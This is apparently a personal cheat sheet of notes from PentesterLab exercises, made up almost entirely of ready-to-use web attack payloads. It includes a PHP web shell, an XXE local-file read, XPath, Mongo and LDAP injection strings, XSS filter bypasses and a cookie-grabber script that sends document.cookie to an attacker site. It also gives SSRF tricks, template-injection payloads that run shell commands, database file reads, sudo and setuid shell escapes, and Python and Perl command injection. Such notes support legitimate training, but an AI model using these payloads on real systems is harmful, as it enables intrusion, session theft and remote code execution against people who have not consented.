Notes from Pentesterlabs
---

Storing it here because I don't want so many repos

## /etc/passwd 

```
Shell cannot be spawned by this user
messagebus:x:104:108::/var/run/dbus:/bin/false 
bin:x:1:1:bin:/bin:/sbin/nologin

Shell can be spawned by this user
mysql:x:105:109:MySQL Server,,,:/nonexistent:/bin/bash
```

## Web shells

```
Uploading a file with contents:

Filename:
a.php or a.php3

<?php
  system($_GET["cmd"]);
?>

Call commands with the URL 
www.vuln[.]com/a.php?cmd=<linux command>
```

## XML


```
loading local file contents
---
www.vuln[.]com/?xml=<!DOCTYPE%20test%20[<!ENTITY%20x%20SYSTEM%20"file:///pentesterlab.key">]><test>%26x;</test>


exploting xpath
---
www.vuln[.]com/?name=' or '1'='1

Commenting out the rest of the code with null byte %00
www.vuln[.]com/?name=hacker' or 1=1]%00

Traversing up to the parent node, and getting all the child values
www.vuln[.]com/?name=hacker'%20or%201=1]/parent::*/child::node()%00
```

## XSS

```
simple injection
---
www.vuln[.]com/?name=<script>alert(1)</script>


Play around with the cases to circumvent the regex filtering rules
---
www.vuln[.]com/?name=<sCript>alert(1)</scriPt>
www.vuln[.]com/?name=hac<scr<script>ipt>alert(1)</scr</script>ipt>ker


non-script injections
---
<img src='zzzz' onerror='alert(1)' />
<div onmouseover='alert(1)'/> ; onmouseout; onmousemove; onclick
<a onmouseover='alert(1)'/> ; onmouseout; onmousemove; onclick
<a href='javascript:alert(1)' />


Using eval to by pass hardcoded string filtering
---
www.vuln[.]com/?name=<script>eval("al"%2b"ert(1)")</script>


Anchor Injection
---
www.vuln[.]com/index.php#<script>alert(1)</script>


Cookie grabber script
---
Dont forget to encode the + %2b
www.vuln[.]com/?name=<script>document.write('<img src="<malicious website>?c='+document.cookie+'" />');</script>

```

## SSRF

```
Making a request to localhost port 1234 from the server itself
---
www.vuln[.]com/?url=http://localhost:1234/
www.vuln[.]com/?url=http://127.0.0.1:1234/
www.vuln[.]com/?url=http://0.0.0.0:1234/


If the word "localhost" is filtered out
Setting up a malicious DNS service to always return localhost. This allows you to pivot internally
---
www.vuln[.]com/?url=http://assets.pentesterlab.com.hackingwithpentesterlab.link:1234/


jinja injection
---
https://hackerone.com/reports/125980

Replace the values of X to find the appropriate function to execute commands.
In this case, we are calling <class 'subprocess.Popen'>

www.vuln[.]com/?{{.__class__.mro()[X].__subclasses__()[X]("<linux command>",%20shell=True,%20stdout=-1).communicate()}}

www.vuln[.]com/?name={{_self.env.registerUndefinedFilterCallback(%27exec%27)}}{{_self.env.getFilter(%27<linux command>%27)}}
```

### Databases

#### MySQL
```
Read contents of file in MySQL 
---
SELECT LOAD_FILE(<file path>)


By creating a user with length more than the defined varchar, the trailing characters are truncated
This could result in the same username exisiting in the databases
---
mysql> describe users;
+----------+------------+------+-----+---------+-------+
| Field    | Type       | Null | Key | Default | Extra |
+----------+------------+------+-----+---------+-------+
| username | varchar(4) | YES  |     | NULL    |       |
| password | varchar(4) | YES  |     | NULL    |       |
+----------+------------+------+-----+---------+-------+

mysql> INSERT INTO users (username,password) values ('u     u','p2');
Query OK, 1 row affected, 1 warning (0.00 sec)

mysql> select * from users where username='u';
+----------+----------+
| username | password |
+----------+----------+
| u        | p1       |
| u        | p2       |
+----------+----------+

mysql> select * from users where username='u';
+----------+----------+
| username | password |
+----------+----------+
| u        | p1       |
| u        | p2       |
+----------+----------+
```

#### Postgres

```
Reading files from postgres
---
create table demo(t text)
copy demo from <filename>
select * from demo
```

#### Mongo

```
Mongo DB Injection

URL encode your attacks, but  not the null byte at the end. You have to add the null byte %00 yourself

ATTACK THE URL, NOT THE FORM --> The form transforms the values before sending it out to the server.
By putting the command directly to the URL, it bypasses the form
---

or 1==1 attack, terminated with a null byte %00
www.vuln[.]com/?username=test' || 1==1 %00&password=&submit=Submit
```

### Sudo

```
find out what commands you can run as sudo
---
sudo -l


run commands as another user
---
sudo -u <account> <command>


spawn shell from vim or less
---
:!/bin/bash


setuid
Anyone who runs this file, run it as if you are the owner of the file
---
chmod u+s <file>
-rwsr-sr-x

setgid
Anyone who runs this file, run it as if you are in the same group as this file
---
chmod g+s <file>
-rwsr-sr-x


nodeJS bash spawn
---
var exec = require('child_process').exec;
exec('[COMMAND]', function (error, stdOut, stdErr) {
console.log(stdOut);
});

sudo -u victim node 'foo.js'
```

### Command Injection

```
python servers
---
Terminate with " and str(os.popen().read())
www.vuln[.]com/hello/hacker"%2bstr(os.popen('ls').read())%2b"

If os is not imported
www.vuln[.]com/hello/hacker"%2bstr(__import__('os').popen('ls').read())%2b"

Passing in base64 commands
www.vuln[.]com/hello/hacker"%2bstr(__import__('os').popen(__import__('base64').b64decode(<b64command>)).read())%2b"


perl server
---
www.vuln[.]com/?name=".`<linux command to run>`."
```

### PHP

```
strstr can be bypassed by inserting a null byte in the string
---
strstr("passw\0ord" "password")


Strings in PHP will be converted to an integer if an integer is appended infront of it
---
"1hello" > 0 == True


You can include file contents with
---
<?php  include '<filename>';?>
<?php echo file_get_contents('/etc/natas_webpass/natas27'); ?>

```

### LDAP

```
LDAP NULL bind
---
Removing the paramters in the post request. Some LDAP servers authorise NULL Bind: if null values are sent, the LDAP server will proceed to bind the connection, and the PHP code will think that the credentials are correct. To get the bind with 2 null values, you will need to completely remove this parameter from the query.


LDAP Syntax
---
A boolean OR using | to get records matching [INPUT1] or [INPUT2].
(|(cn=[INPUT1])(cn=[INPUT2]))

A boolean AND using & to get records for which the cn matches [INPUT1] and the password matches [INPUT2].
(&(cn=[INPUT1])(userPassword=[INPUT2]))

Password hash checking
(&(cn=[INPUT1])(userPassword=HASH[INPUT2]))


LDAP Syntax Injection
this forces the query to search only for user=admin, and we dropped the password check with a null byte
--
www.vuln[.]com//?name=admin))%00&password=admin

```
